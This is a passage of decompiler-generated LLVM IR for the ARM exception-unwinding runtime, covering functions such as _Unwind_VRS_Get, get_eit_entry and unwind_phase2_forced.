  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_17cfc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17d0c = icmp eq i32 %regclass, 0
  br i1 %v2_17d0c, label %dec_label_pc_17d14, label %dec_label_pc_17d44

dec_label_pc_17d14:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d14
  %v6_17d18 = icmp eq i32 %representation, 0
  br i1 %v6_17d18, label %dec_label_pc_17d28, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17d14
  br label %dec_label_pc_17d50

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17d50

dec_label_pc_17d28:                               ; preds = %bb
  %v3_17d28 = mul i32 %regno, 4
  %v2_17d2c = add i32 %v3_17d28, %context
  %v1_17d30 = add i32 %v2_17d2c, 4
  %v2_17d30 = inttoptr i32 %v1_17d30 to i32*
  %v3_17d30 = load i32, i32* %v2_17d30, align 4
  %v2_17d3c = bitcast i8* %valuep to i32*
  store i32 %v3_17d30, i32* %v2_17d3c, align 4
  ret i32 0

dec_label_pc_17d44:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17d44
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17d44, %bb9
  %v0_17d4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17d4c)
  br label %dec_label_pc_17d50

dec_label_pc_17d50:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17d50, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17d58 = icmp eq i32 %regclass, 0
  br i1 %v2_17d58, label %dec_label_pc_17d60, label %dec_label_pc_17d90

dec_label_pc_17d60:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d60
  %v6_17d64 = icmp eq i32 %representation, 0
  br i1 %v6_17d64, label %dec_label_pc_17d74, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17d60
  br label %dec_label_pc_17d9c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17d9c

dec_label_pc_17d74:                               ; preds = %bb
  %v3_17d78 = mul i32 %regno, 4
  %v1_17d7c = bitcast i8* %valuep to i32*
  %v2_17d7c = load i32, i32* %v1_17d7c, align 4
  %v2_17d80 = add i32 %v3_17d78, %context
  %v2_17d88 = add i32 %v2_17d80, 4
  %v3_17d88 = inttoptr i32 %v2_17d88 to i32*
  store i32 %v2_17d7c, i32* %v3_17d88, align 4
  ret i32 0

dec_label_pc_17d90:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17d90
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17d90, %bb9
  %v0_17d98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17d98)
  br label %dec_label_pc_17d9c

dec_label_pc_17d9c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17d9c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_17da4 = add i32 %context, 68
  %v2_17da4 = inttoptr i32 %v1_17da4 to i32*
  %v3_17da4 = load i32, i32* %v2_17da4, align 4
  ret i32 %v3_17da4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_17db4 = add i32 %exc, 8
  %v2_17db4 = inttoptr i32 %v1_17db4 to i32*
  %v3_17db4 = load i32, i32* %v2_17db4, align 4
  %v2_17db8 = icmp eq i32 %v3_17db4, 0
  br i1 %v2_17db8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_17dcc = xor i1 %v2_17db8, true
  call void @__pseudo_cond_branch(i1 %v2_17dcc, i32 %v3_17db4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17de4 = call i32 @abort()
  ret i32 %v0_17de4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17df0 = call i32 @abort()
  ret i32 %v0_17df0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_17df4 = load i32, i32* @r4, align 4
  store i32 %v3_17df4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r5.global-to-local, align 4
  %v4_17e04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 132) to i32*), align 4
  %v2_17e08 = icmp eq i32 %v4_17e04, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_17e14 = add i32 %return_address, -2
  store i32 %v1_17e14, i32* %r4.global-to-local, align 4
  br i1 %v2_17e08, label %dec_label_pc_17e4c, label %dec_label_pc_17e1c

dec_label_pc_17e1c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_17e04)
  %v2_17e2c = icmp eq i32 %v1_17e14, 0
  br i1 %v2_17e2c, label %.thread, label %dec_label_pc_17e6cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_17e1c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_17e34 = load i32, i32* %r6.global-to-local, align 4
  %v3_17e34 = add i32 %v2_17e34, 16
  %v4_17e34 = inttoptr i32 %v3_17e34 to i32*
  store i32 0, i32* %v4_17e34, align 4
  br label %dec_label_pc_17e3c

dec_label_pc_17e3c:                               ; preds = %.thread, %.thread10, %dec_label_pc_17fe4, %dec_label_pc_17fd0, %dec_label_pc_17fac, %dec_label_pc_17f84, %dec_label_pc_17e84
  %v0_17e3c = load i32, i32* %r2.global-to-local, align 4
  %v2_17e44 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17e44, i32* @r4, align 4
  ret i32 %v0_17e3c

dec_label_pc_17e4c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_17e54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 20) to i32*), align 4
  %v4_17e58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 48) to i32*), align 4
  store i32 %v4_17e58, i32* %r2.global-to-local, align 4
  %v2_17e5c = sub i32 %v4_17e54, %v4_17e58
  %v3_17e60 = sdiv i32 %v2_17e5c, 8
  store i32 %v3_17e60, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17e6c

dec_label_pc_17e6cthread-pre-split:               ; preds = %dec_label_pc_17e1c
  %v3_17e6c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17e6c

dec_label_pc_17e6c:                               ; preds = %dec_label_pc_17e6cthread-pre-split, %dec_label_pc_17e4c
  %v0_17eb0.pre = phi i32 [ %v1_17e14, %dec_label_pc_17e6cthread-pre-split ], [ %v4_17e58, %dec_label_pc_17e4c ]
  %v1_17e74 = phi i32 [ %v3_17e6c.pr, %dec_label_pc_17e6cthread-pre-split ], [ %v3_17e60, %dec_label_pc_17e4c ]
  %v2_17e70 = icmp eq i32 %v1_17e74, 0
  br i1 %v2_17e70, label %dec_label_pc_17e84, label %dec_label_pc_17ea0.preheader

dec_label_pc_17ea0.preheader:                     ; preds = %dec_label_pc_17e6c
  %v2_17e74 = add i32 %v1_17e74, -1
  %v1_17ed0 = add i32 %v0_17eb0.pre, 8
  br label %dec_label_pc_17ea0.outer

dec_label_pc_17e84.loopexit:                      ; preds = %dec_label_pc_17efc
  br label %dec_label_pc_17e84

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e84.loopexit, %dec_label_pc_17e6c, %dec_label_pc_17fc8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_17e8c = load i32, i32* %r6.global-to-local, align 4
  %v2_17e8c = add i32 %v1_17e8c, 16
  %v3_17e8c = inttoptr i32 %v2_17e8c to i32*
  store i32 0, i32* %v3_17e8c, align 4
  br label %dec_label_pc_17e3c

dec_label_pc_17e94:                               ; preds = %dec_label_pc_17ef0
  %v3_17e94 = icmp ult i32 %storemerge40, %v0_17ef4
  br i1 %v3_17e94, label %dec_label_pc_17e9c, label %dec_label_pc_17f0c

dec_label_pc_17e9c:                               ; preds = %dec_label_pc_17e94
  %v1_17e9c = add nsw i32 %v3_17ea8, 1
  br label %dec_label_pc_17ea0.outer

dec_label_pc_17ea0.outer:                         ; preds = %dec_label_pc_17e9c, %dec_label_pc_17ea0.preheader
  %v1_17efc.ph = phi i32 [ %v1_17e9c, %dec_label_pc_17e9c ], [ 0, %dec_label_pc_17ea0.preheader ]
  %v0_17ea0.ph = phi i32 [ %v0_17ea0, %dec_label_pc_17e9c ], [ %v2_17e74, %dec_label_pc_17ea0.preheader ]
  br label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17ea0.outer, %dec_label_pc_17f04
  %v0_17ea0 = phi i32 [ %v1_17f04, %dec_label_pc_17f04 ], [ %v0_17ea0.ph, %dec_label_pc_17ea0.outer ]
  %v2_17ea0 = add i32 %v0_17ea0, %v1_17efc.ph
  %tmp = icmp slt i32 %v2_17ea0, 0
  %v4_17ea4 = zext i1 %tmp to i32
  %v5_17ea4 = add i32 %v4_17ea4, %v2_17ea0
  %v3_17ea8 = sdiv i32 %v5_17ea4, 2
  %v3_17eac = mul i32 %v3_17ea8, 8
  store i32 %v3_17eac, i32* @ip, align 4
  %v2_17eb0 = add i32 %v3_17eac, %v0_17eb0.pre
  %v3_17eb0 = inttoptr i32 %v2_17eb0 to i32*
  %v4_17eb0 = load i32, i32* %v3_17eb0, align 4
  %v1_17eb4 = and i32 %v4_17eb0, 1073741824
  %v2_17eb4 = icmp eq i32 %v1_17eb4, 0
  %v2_17eb8 = or i32 %v4_17eb0, -2147483648
  %tmp79 = bitcast i32 %v4_17eb0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_17ebc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_17eb4, i32 %v2_17ebc, i32 %v2_17eb8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_17ec0 = icmp eq i32 %v2_17e74, %v3_17ea8
  store i32 %v2_17eb0, i32* %r7.global-to-local, align 4
  br i1 %v9_17ec0, label %dec_label_pc_17ef0, label %dec_label_pc_17ed0

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17ea0
  %v2_17ed4 = add i32 %v3_17eac, %v1_17ed0
  %v3_17ed4 = inttoptr i32 %v2_17ed4 to i32*
  %v4_17ed4 = load i32, i32* %v3_17ed4, align 4
  %v1_17edc = and i32 %v4_17ed4, 1073741824
  %v2_17edc = icmp eq i32 %v1_17edc, 0
  %v2_17ee0 = or i32 %v4_17ed4, -2147483648
  %tmp81 = bitcast i32 %v4_17ed4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_17ee4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_17edc, i32 %v2_17ee4, i32 %v2_17ee0
  %v1_17ee8 = add i32 %v2_17ed4, -1
  %v2_17eec = add i32 %storemerge39, %v1_17ee8
  br label %dec_label_pc_17ef0

dec_label_pc_17ef0:                               ; preds = %dec_label_pc_17ea0, %dec_label_pc_17ed0
  %storemerge40 = phi i32 [ %v2_17eec, %dec_label_pc_17ed0 ], [ -1, %dec_label_pc_17ea0 ]
  %v2_17ef0 = add i32 %storemerge, %v2_17eb0
  %v0_17ef4 = load i32, i32* %r4.global-to-local, align 4
  %v3_17ef4 = icmp ult i32 %v0_17ef4, %v2_17ef0
  br i1 %v3_17ef4, label %dec_label_pc_17efc, label %dec_label_pc_17e94

dec_label_pc_17efc:                               ; preds = %dec_label_pc_17ef0
  %v9_17efc = icmp eq i32 %v3_17ea8, %v1_17efc.ph
  br i1 %v9_17efc, label %dec_label_pc_17e84.loopexit, label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17efc
  %v1_17f04 = add nsw i32 %v3_17ea8, -1
  br label %dec_label_pc_17ea0

dec_label_pc_17f0c:                               ; preds = %dec_label_pc_17e94
  %v2_17f0c = load i32, i32* %v3_17eb0, align 4
  %v1_17f10 = and i32 %v2_17f0c, 1073741824
  %v2_17f10 = icmp eq i32 %v1_17f10, 0
  %v2_17f14 = or i32 %v2_17f0c, -2147483648
  %tmp83 = bitcast i32 %v2_17f0c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_17f18 = bitcast float %tmp84 to i32
  %v0_17f1c = select i1 %v2_17f10, i32 %v2_17f18, i32 %v2_17f14
  %v2_17f1c = add i32 %v0_17f1c, %v2_17eb0
  %v1_17f20 = load i32, i32* %r6.global-to-local, align 4
  %v2_17f20 = add i32 %v1_17f20, 72
  %v3_17f20 = inttoptr i32 %v2_17f20 to i32*
  store i32 %v2_17f1c, i32* %v3_17f20, align 4
  %v0_17f24 = load i32, i32* %r7.global-to-local, align 4
  %v1_17f24 = add i32 %v0_17f24, 4
  %v2_17f24 = inttoptr i32 %v1_17f24 to i32*
  %v3_17f24 = load i32, i32* %v2_17f24, align 4
  %v7_17f28 = icmp eq i32 %v3_17f24, 1
  br i1 %v7_17f28, label %.thread10, label %dec_label_pc_17f3c

.thread10:                                        ; preds = %dec_label_pc_17f0c
  %v1_17f28 = add i32 %v3_17f24, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_17f34 = load i32, i32* %r6.global-to-local, align 4
  %v3_17f34 = add i32 %v2_17f34, 16
  %v4_17f34 = inttoptr i32 %v3_17f34 to i32*
  store i32 %v1_17f28, i32* %v4_17f34, align 4
  br label %dec_label_pc_17e3c

dec_label_pc_17f3c:                               ; preds = %dec_label_pc_17f0c
  %v1_17f3c = icmp slt i32 %v3_17f24, 0
  br i1 %v1_17f3c, label %.thread38, label %dec_label_pc_17f54

.thread38:                                        ; preds = %dec_label_pc_17f3c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_17f48 = load i32, i32* %r6.global-to-local, align 4
  %v5_17f48 = add i32 %v4_17f48, 76
  %v6_17f48 = inttoptr i32 %v5_17f48 to i32*
  store i32 %v1_17f24, i32* %v6_17f48, align 4
  %v3_17f4c = load i32, i32* %r2.global-to-local, align 4
  %v4_17f4c = load i32, i32* %r6.global-to-local, align 4
  %v5_17f4c = add i32 %v4_17f4c, 80
  %v6_17f4c = inttoptr i32 %v5_17f4c to i32*
  store i32 %v3_17f4c, i32* %v6_17f4c, align 4
  br label %dec_label_pc_17f74

dec_label_pc_17f54:                               ; preds = %dec_label_pc_17f3c
  %v1_17f54 = and i32 %v3_17f24, 1073741824
  %v2_17f54 = icmp eq i32 %v1_17f54, 0
  %v2_17f58 = or i32 %v3_17f24, -2147483648
  %tmp85 = bitcast i32 %v3_17f24 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_17f5c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_17f54, i32 %v2_17f5c, i32 %v2_17f58
  %v1_17f60 = add i32 %storemerge42, 4
  %v2_17f64 = add i32 %v1_17f60, %v0_17f24
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17f6c = load i32, i32* %r6.global-to-local, align 4
  %v2_17f6c = add i32 %v1_17f6c, 76
  %v3_17f6c = inttoptr i32 %v2_17f6c to i32*
  store i32 %v2_17f64, i32* %v3_17f6c, align 4
  %v0_17f70 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f70 = load i32, i32* %r6.global-to-local, align 4
  %v2_17f70 = add i32 %v1_17f70, 80
  %v3_17f70 = inttoptr i32 %v2_17f70 to i32*
  store i32 %v0_17f70, i32* %v3_17f70, align 4
  br label %dec_label_pc_17f74

dec_label_pc_17f74:                               ; preds = %.thread38, %dec_label_pc_17f54
  %v0_17f74 = load i32, i32* %r6.global-to-local, align 4
  %v1_17f74 = add i32 %v0_17f74, 76
  %v2_17f74 = inttoptr i32 %v1_17f74 to i32*
  %v3_17f74 = load i32, i32* %v2_17f74, align 4
  store i32 %v3_17f74, i32* %r2.global-to-local, align 4
  %v1_17f78 = inttoptr i32 %v3_17f74 to i32*
  %v2_17f78 = load i32, i32* %v1_17f78, align 4
  %v1_17f7c = icmp slt i32 %v2_17f78, 0
  br i1 %v1_17f7c, label %dec_label_pc_17fa0, label %dec_label_pc_17f84

dec_label_pc_17f84:                               ; preds = %dec_label_pc_17f74
  %v1_17f84 = and i32 %v2_17f78, 1073741824
  %v2_17f84 = icmp eq i32 %v1_17f84, 0
  %v2_17f88 = or i32 %v2_17f78, -2147483648
  %tmp87 = bitcast i32 %v2_17f78 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_17f8c = bitcast float %tmp88 to i32
  %v0_17f90 = select i1 %v2_17f84, i32 %v2_17f8c, i32 %v2_17f88
  %v2_17f90 = add i32 %v0_17f90, %v3_17f74
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17f98 = add i32 %v0_17f74, 16
  %v3_17f98 = inttoptr i32 %v2_17f98 to i32*
  store i32 %v2_17f90, i32* %v3_17f98, align 4
  br label %dec_label_pc_17e3c

dec_label_pc_17fa0:                               ; preds = %dec_label_pc_17f74
  %v3_17fa0 = udiv i32 %v2_17f78, 16777216
  %v1_17fa4 = urem i32 %v3_17fa0, 16
  %v2_17fa4 = icmp eq i32 %v1_17fa4, 0
  br i1 %v2_17fa4, label %dec_label_pc_17fac, label %dec_label_pc_17fc0

dec_label_pc_17fac:                               ; preds = %dec_label_pc_17fa0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17fb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17fb4 = add i32 %v0_17fb4, -36896
  %v2_17fb8 = add i32 %v0_17f74, 16
  %v3_17fb8 = inttoptr i32 %v2_17fb8 to i32*
  store i32 %v2_17fb4, i32* %v3_17fb8, align 4
  br label %dec_label_pc_17e3c

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fa0
  %v7_17fc0 = icmp eq i32 %v1_17fa4, 1
  br i1 %v7_17fc0, label %dec_label_pc_17fe4, label %dec_label_pc_17fc8

dec_label_pc_17fc8:                               ; preds = %dec_label_pc_17fc0
  %v7_17fc8 = icmp eq i32 %v1_17fa4, 2
  br i1 %v7_17fc8, label %dec_label_pc_17fd0, label %dec_label_pc_17e84

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fc8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17fd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17fd8 = add i32 %v0_17fd8, -36912
  %v2_17fdc = add i32 %v0_17f74, 16
  %v3_17fdc = inttoptr i32 %v2_17fdc to i32*
  store i32 %v2_17fd8, i32* %v3_17fdc, align 4
  br label %dec_label_pc_17e3c

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17fc0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17fec = load i32, i32* %r5.global-to-local, align 4
  %v2_17fec = add i32 %v0_17fec, -36904
  %v2_17ff0 = add i32 %v0_17f74, 16
  %v3_17ff0 = inttoptr i32 %v2_17ff0 to i32*
  store i32 %v2_17fec, i32* %v3_17ff0, align 4
  br label %dec_label_pc_17e3c

; uselistorder directives
  uselistorder i32 %v1_17fa4, { 2, 1, 0 }
  uselistorder i32 %v0_17f74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_17f24, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17ef4, { 1, 0 }
  uselistorder i32 %v3_17eac, { 2, 1, 0 }
  uselistorder i32 %v3_17ea8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_17ea0, { 1, 0 }
  uselistorder i32 %v0_17ea0, { 1, 0 }
  uselistorder i32 %v2_17e74, { 1, 0 }
  uselistorder i32 %v0_17eb0.pre, { 1, 0 }
  uselistorder i32 %v3_17e60, { 1, 0 }
  uselistorder i32 %v1_17e14, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17f74, { 1, 0 }
  uselistorder label %dec_label_pc_17ef0, { 1, 0 }
  uselistorder label %dec_label_pc_17ea0, { 1, 0 }
  uselistorder label %dec_label_pc_17e84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17e3c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_17ffc(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ffc:
  %v0_17ffc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ffc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17ffc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17ffc, %bb
  %v10_18004 = phi i32 [ %arg1, %dec_label_pc_17ffc ], [ 0, %bb ]
  ret i32 %v10_18004

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18018 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1802c = inttoptr i32 %v1_18018 to i32*
  %v2_1802c = load i32, i32* %v1_1802c, align 4
  store i32 %v2_1802c, i32* %r0.global-to-local, align 4
  %v12_1802c = add i32 %entry_vrs, 20
  %v1_18038 = inttoptr i32 %v12_1802c to i32*
  %v2_18038 = load i32, i32* %v1_18038, align 4
  store i32 %v2_18038, i32* %r0.global-to-local, align 4
  %v12_18038 = add i32 %entry_vrs, 36
  %v1_18040 = inttoptr i32 %v12_18038 to i32*
  %v2_18040 = load i32, i32* %v1_18040, align 4
  store i32 %v2_18040, i32* %r0.global-to-local, align 4
  %v12_18040 = add i32 %entry_vrs, 52
  store i32 %v12_18040, i32* @ip, align 4
  %v13_18044 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_18044, i32* @lr, align 4
  %v1_18048 = inttoptr i32 %v12_18040 to i32*
  %v2_18048 = load i32, i32* %v1_18048, align 4
  store i32 %v2_18048, i32* %r0.global-to-local, align 4
  %v9_18048 = add i32 %entry_vrs, 64
  %v10_18048 = inttoptr i32 %v9_18048 to i32*
  %v11_18048 = load i32, i32* %v10_18048, align 4
  store i32 0, i32* @r4, align 4
  %v1_18050 = add i32 %ucbp, 12
  %v2_18050 = inttoptr i32 %v1_18050 to i32*
  %v3_18050 = load i32, i32* %v2_18050, align 4
  store i32 %v2_18048, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_18068 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18048)
  store i32 %v2_18068, i32* %r0.global-to-local, align 4
  %v0_1806c = load i32, i32* @r6, align 4
  %v1_1806c = load i32, i32* @r4, align 4
  %v9_1806c = icmp eq i32 %v0_1806c, %v1_1806c
  store i32 %v2_18068, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1806c, label %dec_label_pc_18080, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1808c

dec_label_pc_18080:                               ; preds = %entry
  store i32 %v0_1806c, i32* @r4, align 4
  br label %dec_label_pc_18088

dec_label_pc_18088:                               ; preds = %dec_label_pc_18150, %dec_label_pc_18080
  br label %dec_label_pc_1808c

dec_label_pc_1808c:                               ; preds = %.thread, %dec_label_pc_18088
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18088 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1808c = icmp eq i32 %v2_18068, 0
  br i1 %v2_1808c, label %dec_label_pc_18104, label %.thread2.dec_label_pc_180a0_crit_edge

.thread2.dec_label_pc_180a0_crit_edge:            ; preds = %dec_label_pc_1808c
  br label %dec_label_pc_180a0

dec_label_pc_180a0:                               ; preds = %.thread2.dec_label_pc_180a0_crit_edge, %dec_label_pc_18104
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_180b0 = load i32, i32* @r5, align 4
  store i32 %v0_180b0, i32* @r3, align 4
  store i32 98496, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_18050)
  br i1 false, label %dec_label_pc_180c8, label %dec_label_pc_180f0

dec_label_pc_180c8:                               ; preds = %dec_label_pc_180a0
  br i1 undef, label %dec_label_pc_180d0, label %dec_label_pc_180f4

dec_label_pc_180d0:                               ; preds = %dec_label_pc_180c8
  br i1 undef, label %dec_label_pc_18150, label %dec_label_pc_180e8

dec_label_pc_180e8:                               ; preds = %dec_label_pc_180d0
  br i1 undef, label %dec_label_pc_18148, label %dec_label_pc_180f0

dec_label_pc_180f0:                               ; preds = %dec_label_pc_180a0, %dec_label_pc_180e8
  br label %dec_label_pc_180f4

dec_label_pc_180f4:                               ; preds = %dec_label_pc_180c8, %dec_label_pc_180f0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18104:                               ; preds = %dec_label_pc_1808c
  store i32 %v11_18048, i32* @r3, align 4
  %v2_18108 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18108, i32* @r4, align 4
  %v1_1810c = load i32, i32* @r5, align 4
  %v2_1810c = add i32 %v1_1810c, 20
  %v3_1810c = inttoptr i32 %v2_1810c to i32*
  store i32 %v11_18048, i32* %v3_1810c, align 4
  store i32 %v2_18108, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1811c = call i32 @memcpy()
  %v0_18124 = load i32, i32* @r6, align 4
  store i32 %v0_18124, i32* %r0.global-to-local, align 4
  %v0_18128 = load i32, i32* @r5, align 4
  %v1_1812c = add i32 %v0_18128, 16
  %v2_1812c = inttoptr i32 %v1_1812c to i32*
  %v3_1812c = load i32, i32* %v2_1812c, align 4
  store i32 %v3_1812c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1812c)
  %v0_1813c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1813c, i32* @r4, align 4
  br label %dec_label_pc_180a0

dec_label_pc_18148:                               ; preds = %dec_label_pc_180e8
  br label %dec_label_pc_18150

dec_label_pc_18150:                               ; preds = %dec_label_pc_180d0, %dec_label_pc_18148
  br label %dec_label_pc_18088

; uselistorder directives
  uselistorder i32 %v11_18048, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 106, 107, 41, 42, 30, 108, 109, 33, 110, 111, 3, 112, 113, 114, 4, 115, 116, 117, 5, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 0, 136, 137, 138, 139, 31, 32, 34, 35, 36, 37, 38, 39, 40, 90, 64, 65, 66, 140, 141, 154, 155, 156, 144, 145, 146, 147, 148, 1, 149, 6, 44, 45, 142, 143, 57, 58, 103, 104, 105, 100, 101, 96, 97, 99, 98, 9, 10, 11, 160, 157, 158, 159, 2, 161, 162, 163, 43, 67, 46, 47, 48, 49, 50, 51, 150, 151, 152, 153, 59, 60, 61, 74, 75, 76, 77, 68, 69, 70, 8, 78, 79, 80, 81, 82, 24, 25, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 26, 27, 28, 29, 52, 53, 54, 102, 55, 56, 62, 63, 71, 7, 72, 73, 83, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95 }
  uselistorder i32 10, { 4, 5, 31, 32, 33, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 34, 10, 26, 11, 27, 12, 28, 13, 29, 30, 23, 6, 35, 24, 14, 3, 25, 36, 15, 37, 38, 16, 17, 18, 41, 9, 46, 47, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 19, 59, 60, 61, 20, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 21, 73, 22 }
